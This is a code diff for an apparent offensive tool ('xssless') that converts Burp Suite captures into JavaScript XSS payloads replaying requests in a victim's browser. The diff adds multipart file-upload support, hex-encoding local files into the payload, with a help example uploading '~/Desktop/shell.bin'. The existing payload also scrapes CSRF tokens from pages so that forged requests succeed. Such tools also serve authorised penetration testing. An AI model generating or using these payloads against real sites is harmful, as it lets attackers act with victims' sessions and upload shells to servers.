@@ -4,7 +4,8 @@ from bs4 import BeautifulSoup
 import base64
 import json
 import os
-
+import magic
+# Import burp export and return a list of decoded data
 def get_burp_list(filename):
     if not os.path.exists(filename):
         return []
@@ -27,6 +28,19 @@ def get_burp_list(filename):
     
     return requestList
 
+# Return hex encoded string output of binary input
+def payload_encode_file(input_file):
+    filecontents = open(input_file).read()
+    hue = filecontents.encode("hex")
+    filecontents = '\\x' + '\\x'.join(hue[i:i+2] for i in xrange(0, len(hue), 2)) # Stackoverflow, because pythonistic
+    return filecontents
+
+# Return hex encoded string output of binary input
+def payload_encode_input(filecontents):
+    hue = filecontents.encode("hex")
+    filecontents = '\\x' + '\\x'.join(hue[i:i+2] for i in xrange(0, len(hue), 2)) # Stackoverflow, because pythonistic
+    return filecontents
+
 # Get a list of headers for request/response
 def parse_request(input_var, url):
     
@@ -36,7 +50,12 @@ def parse_request(input_var, url):
     # Split request into headers/body and parse header into list
     request_parts = input_var.split("\r\n\r\n")
     header_data = request_parts[0]
-    body_data = request_parts[1]
+
+    if len(request_parts) > 2:
+        body_data = "\r\n\r\n".join(request_parts[1:]) # Get everything after the first \r\n\r\n incase of file upload
+    else:
+        body_data = request_parts[1] # Only two parts so it's just a regular POST
+
     header_lines = header_data.split("\r\n")
     header_lines = filter(None, header_lines) # Filter any blank lines
 
@@ -63,20 +82,63 @@ def parse_request(input_var, url):
         del headerDict
         del tmpList
 
-    # Create a list of body values (check for JSON, etc)
-    # bodyList[0]['Key'] = "username"
-    # bodyList[0]['Value'] = "mandatory"
+    postisupload = False
+    fileboundary = ""
+
+    for headerpair in headerList:
+        if headerpair['Key'] == 'Content-Type':
+            if 'boundary=' in headerpair['Value']:
+                fileboundary = headerpair['Value'].split("boundary=")[1] 
+                postisupload = True
+
+    # List of all POST data
     bodyList = []
-    body_var_List = body_data.split("&")
-    body_var_List = filter(None, body_var_List)
-    for item in body_var_List:
-        tmpList = item.split("=")
-        bodyDict = {}
-        bodyDict['Key'] = tmpList[0]
-        bodyDict['Value'] = tmpList[1]
-        bodyList.append(bodyDict)
-        del tmpList
-        del bodyDict
+
+    # If the form is multipart the rules change, set values accordingly and pass it one
+    if postisupload:
+        postpartsList = body_data.split(fileboundary)
+        
+        # FF adds a bunch of '-' characters, so we'll filter out anything without a Content-Disposition in it
+        for key, value in enumerate(postpartsList):
+            if 'Content-Disposition' not in value:
+                postpartsList.remove(value)
+
+        for part in postpartsList:
+            sectionHeader, sectionBody = part.split("\r\n\r\n")
+            sectionBody = sectionBody.replace("\r\n--", "")
+            tmp = {}
+            tmp['name'] = sectionHeader.split("name=\"")[1].split("\"")[0] # Hacky name parsing solution
+
+            if 'filename="' in sectionHeader:
+                tmp['isfile'] = True
+                tmp['filename'] = sectionHeader.split("filename=\"")[1].split("\"")[0] # Same
+                tmp['contenttype'] = sectionHeader.split("Content-Type: ")[1]
+                tmp['binary'] = sectionBody
+                sectionBody = payload_encode_input(sectionBody)
+            else:
+                tmp['isfile'] = False
+
+            tmp['body'] = sectionBody
+            bodyList.append(tmp)
+            del tmp
+            del sectionHeader
+            del sectionBody
+
+    else:
+        # Create a list of body values (check for JSON, etc)
+        # bodyList[0]['Key'] = "username"
+        # bodyList[0]['Value'] = "mandatory"
+        body_var_List = body_data.split("&")
+        body_var_List = filter(None, body_var_List)
+        for item in body_var_List:
+            tmpList = item.split("=")
+            bodyDict = {}
+            bodyDict['Key'] = tmpList[0]
+            bodyDict['Value'] = tmpList[1]
+            bodyList.append(bodyDict)
+            del tmpList
+            del bodyDict
+
         
     # Returned dict, chocked full of useful information formatted nicely for your convienience!
     returnDict = {}
@@ -90,6 +152,8 @@ def parse_request(input_var, url):
     returnDict['body_text'] = body_data # Raw text of HTTP body
     returnDict['flags'] = flags # Special flags
     returnDict['url'] = url
+    returnDict['isupload'] = postisupload
+    returnDict['boundary'] = fileboundary
 
     return returnDict
 
@@ -141,8 +205,10 @@ def parse_response(input_var, url):
 
     return returnDict
 
+# Generate the main payload
 def xss_gen(requestList, settingsDict):
 
+    # Start of the payload, uncompressed
     payload = """
 <script type="text/javascript">
     var funcNum = 0;
@@ -169,6 +235,15 @@ def xss_gen(requestList, settingsDict):
             http.setRequestHeader('Content-length', body.length);
             http.setRequestHeader('Connection', 'close');
             http.send(body);
+        } else if (method == "MPOST") {
+            http.open('POST', url, true);
+            var bound = Math.random().toString(36).slice(2);
+            body = body.split("BOUNDMARKER").join(bound);
+            http.setRequestHeader('Content-type', 'multipart/form-data, boundary=' + bound);
+            http.setRequestHeader('Content-length', body.length);
+            http.setRequestHeader('Connection', 'close');
+            http.sendAsBinary(body);
+                
         } else if (method == "GET") {
             http.open('GET', url, true); 
             http.send();
@@ -184,27 +259,76 @@ def xss_gen(requestList, settingsDict):
     # Each request is done as a function that one requestion completion, calls the next function.
     # The result is an unclobered browser and no race conditions! (Because cookies may need to be set, etc)
 
+    # Counter for function numbers
     i = 0
     for conv in requestList:
         requestDict = parse_request(conv['request'], conv['url'])
-        responseDict = parse_response(conv['response'], conv['url'])
+        responseDict = parse_response(conv['response'], conv['url']) # Currently unused, for future heuristics
 
         payload += "    function r" + str(i) + "(requestDoc){\n"
 
         if requestDict['method'].lower() == "post":
-            postString = ""
-            for pair in requestDict['bodyList']:
-                if 'parseList' in settingsDict:
-                    if pair['Key'] in settingsDict['parseList']:
-                        postString += pair['Key'] + "=" + "' + encodeURIComponent(requestDoc.getElementsByName('" + pair['Key'] + "')[0].value) + '&"
+            if requestDict['isupload'] == True:
+                payload += "       doRequest('" + requestDict['url'] + "', 'MPOST', '"
+                multipart = ""
+                for item in requestDict['bodyList']:
+                    multipart += "--BOUNDMARKER\\r\\n"
+                    if item['isfile'] == True:
+
+                        if 'fileDict' in settingsDict:
+                            if item['name'] in settingsDict['fileDict']:
+                                filecontents = payload_encode_file(settingsDict['fileDict'][item['name']])
+
+                                # Find content type
+                                m = magic.open(magic.MAGIC_MIME)
+                                m.load()
+                                content_type = m.file(settingsDict['fileDict'][item['name']])
+
+                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"; filename="' + item['filename'] + '"\\r\\n'
+                                multipart += 'Content-Type: ' + content_type + '\\r\\n\\r\\n'
+                                multipart += filecontents + '\\r\\n'
+
+                                del filecontents
+                                del content_type
+                                del m
+                            else:
+                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"; filename="' + item['filename'] + '"\\r\\n'
+                                multipart += 'Content-Type: ' + item['contenttype'] + '\\r\\n\\r\\n'
+                                multipart += item['body'] + '\\r\\n'
+                        else:
+                            multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"; filename="' + item['filename'] + '"\\r\\n'
+                            multipart += 'Content-Type: ' + item['contenttype'] + '\\r\\n\\r\\n'
+                            multipart += item['body'] + '\\r\\n'
+                    else:
+                        if 'parseList' in settingsDict:
+                            if item['name'] in settingsDict['parseList']:
+                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"\\r\\n\\r\\n'
+                                multipart += "' + encodeURIComponent(requestDoc.getElementsByName('" + item['name'] + "')[0].value) + '" + '\\r\\n'
+                            else:
+                                multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"\\r\\n\\r\\n'
+                                multipart += item['body'] + '\\r\\n'
+                        else:
+                            multipart += 'Content-Disposition: form-data; name="' + item['name'] + '"\\r\\n\\r\\n'
+                            multipart += item['body'] + '\\r\\n'
+
+                multipart += "--BOUNDMARKER--"
+                payload += multipart
+                payload += "');\n"
+            else:
+                postString = ""
+                for pair in requestDict['bodyList']:
+                    if 'parseList' in settingsDict:
+                        if pair['Key'] in settingsDict['parseList']:
+                            postString += pair['Key'] + "=" + "' + encodeURIComponent(requestDoc.getElementsByName('" + pair['Key'] + "')[0].value) + '&"
+                        else:
+                            postString += pair['Key'] + "=" + pair['Value'] + "&"
                     else:
                         postString += pair['Key'] + "=" + pair['Value'] + "&"
-                else:
-                    postString += pair['Key'] + "=" + pair['Value'] + "&"
 
-            postString = postString[:-1] # Remove last &
+                postString = postString[:-1] # Remove last &
 
-            payload += "        doRequest('" + requestDict['url'] + "', 'POST', '" + postString + "');\n"
+                payload += "        doRequest('" + requestDict['url'] + "', 'POST', '" + postString + "');\n"
+
         elif requestDict['method'].lower() == "get":
             payload += "        doRequest('" + requestDict['url'] + "', 'GET', '');\n"
         elif requestDict['method'].lower() == "head":
@@ -234,6 +358,7 @@ Example: """ + sys.argv[0] + """ [ OPTION(S) ] [ BURP FILE ]
 
 -h               Show's this help menu
 -p=PARSEFILE     Parse list - input file containing a list of CSRF token names to be automatically parsed and set with JS.
+-f=FILELIST      File list - input list of POST name/filenames to use in payload. ex: 'upload_filename,~/Desktop/shell.bin'
 -s               Don't display the xssless logo
 
 """
@@ -261,9 +386,35 @@ else:
                    tmpList[key] = value.replace("\n", "")
                if len(tmpList):
                    settingsDict['parseList'] = tmpList
-                   del tmpList
+               del tmpList
             else:
                 print "Error, parse list not found!"
+        if "-f=" in option:
+            fileuploadlist = option.replace("-f=", "")
+            if os.path.isfile(fileuploadlist):
+                tmpDict = {}
+                fileuploadlinesList = open(fileuploadlist).readlines()
+                for key, value in enumerate(fileuploadlinesList):
+                    rowparts = value.replace("\n", "").split(",", 1)
+                    if len(rowparts) == 2:
+                        if os.path.isfile(rowparts[1]):
+                            tmpDict[rowparts[0]] = rowparts[1]
+                        else:
+                            print "File '" + rowparts[1] + "' not found!"
+                            sys.exit()
+                    else:
+                        print "Error while parsing file " + fileuploadlist + " on line #" + str(key)
+                        print "    ->'" + value.replace("\n", "") + "'"
+                        sys.exit()
+                    del rowparts
+                if tmpDict:
+                    settingsDict['fileDict'] = tmpDict
+
+                del tmpDict
+                del fileuploadlinesList
+            else:
+                print "Input filelist not found!"
+                sys.exit()
 
     if os.path.exists(sys.argv[-1]):
         inputfile = sys.argv[-1]
